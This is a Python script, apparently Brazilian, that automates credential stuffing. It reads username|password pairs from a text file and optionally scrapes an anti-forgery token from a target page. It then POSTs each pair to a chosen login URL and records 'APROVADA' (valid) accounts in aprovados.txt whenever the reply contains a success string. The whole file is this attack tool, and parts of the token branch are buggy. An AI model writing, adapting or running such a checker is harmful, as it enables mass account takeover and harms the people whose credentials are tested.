# -*- coding: utf-8 -*-


# ============================================================================================= 
# ==                   SCRIPT STARTED!       TOTALLY CREATED BY: HYPN0THCY                   == 
# =============================================================================================  


import os

try:
    import requests
    import json
    from time import sleep as esperar
except Exception:
    try:
        os.system("pip install requests")
    except Exception:
        os.system("cls")
        input("\n\n\n\n         Por Favor, Use a Versão 3.8.4 Do Python!")
        exit()


def getToken(text, start, finish):
    gt0 = text.split(str(start))
    gt1 = gt0[1].split(str(finish))
    return gt1[0]


try:
    txtS_N = str(input("Usará um .TXT? -> ")).strip()
    if txtS_N.lower() == 's':
        file = str(input(
            "\nInsira O Nome Do TXT (NO MESMO LOCAL DO SCRIPT) [Ex: list.txt] -> ")).strip()
        try:

            tokenS_N = str(input("\nChecker Precisará de Token? -> ")).strip()
            if tokenS_N.lower() == "s":
                urlToken = str(input("\nUrl Do Alvo [TOKEN] -> ")).strip()
                if not urlToken:
                    print("\n\n       Por Favor Insirá Algum Link!")
                    exit()
                else:
                    with requests.Session() as r:

                        head = {
                            'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0'}

                        reqGetToken = r.get(urlToken, headers=head)

                        tokenStartText = str(
                            input("\n\nInicio Da Tag Do Token"))
                        tokenFinishText = str(input("\nFinal Da Tag Do Token"))

                        token = getToken(reqGetToken.text,
                                         tokenStartText, tokenFinishText)
                        verTokenS_N = str(
                            input("Deseja Ver o Token? -> ")).strip()
                        if verTokenS_N.lower() == 's':
                            print(token)
                            esperar(7)
                            c = str(input("Deseja Continuar? -> ")).strip()
                            if c.lower() == 'n':
                                exit()
                            else:
                                pass
                        else:
                            pass

                        print(
                            "\nPor Favor, Escreva o (FORM DATA) No Arquivo [formToken.txt]")
                        esperar(7)
                        input("\n\n APOS ESCREVER O FORM, CLIQUE (ENTER)")
                        url = str(input("\n\n Url Do Alvo [POST] -> ")).strip()
                        if not url:
                            print("\n\n       Por Favor Insirá Algum Link!")
                            exit()
                        else:
                            with open("./formToken.txt", "r", encoding="utf8") as formText:
                                formm = formText.readlines()

                                messageSuccess = str(
                                    input("\n Qual a Mensagem De Sucesso? -> ")).strip()

                                with open(f"./{file}", "r", encoding="utf8") as fileOpen:

                                    lines = fileOpen.strip()
                                    for line in lines.readlines():

                                        dado = line.split("|")
                                        formc = formm.replace("dadoForm[0]", dado[0]).replace("dadoForm[1]", dado[1]).replace("TokenHere", TokenHere)
                                        form = json.loads(formc.replace(
                                            '\r\n', ''), strict=False)

                                        reqSendRequest = r.post(
                                            url, headers=head, data=json.dumps(form))
                                        if int(reqSendRequest.status_code) != 404:
                                            if not reqSendRequest.text:
                                                os.system("color 4")
                                                input(
                                                    "O Request Não Retornou NADA!")
                                                exit()
                                            else:
                                                if str(messageSuccess.lower()) in str(reqSendRequest.text.lower()):
                                                    os.system("color 0a")
                                                    print(
                                                        f"APROVADA =>  {dado[0]} | {dado[1]}    #Hypn0thcy_Checkers")
                                                    with open("./aprovados.txt", "a", encoding="utf8") as escrever:
                                                        escrever.write(
                                                            f"APROVADA =>  {dado[0]} | {dado[1]}    #Hypn0thcy_Checkers\n")
                                                        escrever.close()
                                                else:
                                                    print(
                                                        f"REPROVADA =>  {dado[0]} | {dado[1]}")
                                        else:
                                            os.system("color 4")
                                            input("\n\n       ERROR 404")
                                            exit()
            else:
                print(
                    "\nPor Favor, Escreva o (FORM DATA) No Arquivo [form.txt]")
                esperar(4)
                input("\n\n APOS ESCREVER O FORM, CLIQUE (ENTER)")
                url = str(input("\n\n Url Do Alvo [POST] -> ")).strip()
                if not url:
                    print("\n\n       Por Favor Insirá Algum Link!")
                    exit()
                else:
                    with open("./form.txt", "r", encoding="utf8") as formText:
                        formm = formText.read()

                        messageSuccess = str(
                            input("\n Qual a Mensagem De Sucesso? -> ")).strip()

                        with open(f"./{file}", "r", encoding="utf8") as fileOpen:

                            head = {
                                'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0'}

                            # lines = fileOpen.strip()
                            for line in fileOpen.readlines():

                                dado = line.split("|")
                                formc = formm.replace("dadoForm[0]", dado[0]).replace(
                                    "dadoForm[1]", dado[1])
                                form = json.loads(formc.replace(
                                    '\r\n', ''), strict=False)
                                with requests.Session() as r:

                                    reqSendRequest = r.post(
                                        url, headers=head, data=form)

                                    if int(reqSendRequest.status_code) != 404:
                                        if not reqSendRequest.text:
                                            os.system("color 4")
                                            input(
                                                "O Request Não Retornou NADA!")
                                            exit()
                                        else:
                                            if str(messageSuccess.lower()) in str(reqSendRequest.text.lower()):
                                                os.system("color 0a")
                                                print(
                                                    f"APROVADA =>  {dado[0]} | {dado[1]}    #Hypn0thcy_Checkers")
                                                with open("./aprovados.txt", "a", encoding="utf8") as escrever:
                                                    escrever.write(
                                                        f"APROVADA =>  {dado[0]} | {dado[1]}    #Hypn0thcy_Checkers\n")
                                                    escrever.close()
                                            else:
                                                print(
                                                    f"REPROVADA =>  {dado[0]} | {dado[1]}")
                                    else:
                                        os.system("color 4")
                                        input("\n\n       ERROR 404")
                                        exit()

        except Exception as ErrorInTryFile:
            os.system("color 4")
            print(f"\n\n   Erro Critico -> {ErrorInTryFile}")
            input()
            exit()
    else:
        str(input("\nComo Deseja Usar? ")).strip()
        os.system("color 4")
        print("FUNÇÃO INVÁLIDA!!!")
        esperar(5)
        exit()

except KeyboardInterrupt:
    os.system("color 5")
    print("\n\n    ATÉ MAIS!   ^^")
    esperar(5)
    exit()
except Exception as ErrorInTryStart:
    os.system("color 4")
    print(f"\n\n     Erro Critico -> {ErrorInTryStart}")
    input()
    exit()
    
# ============================================================================================= 
# ==                  SCRIPT FINISHED!       TOTALLY CREATED BY: HYPN0THCY                   == 
# =============================================================================================  
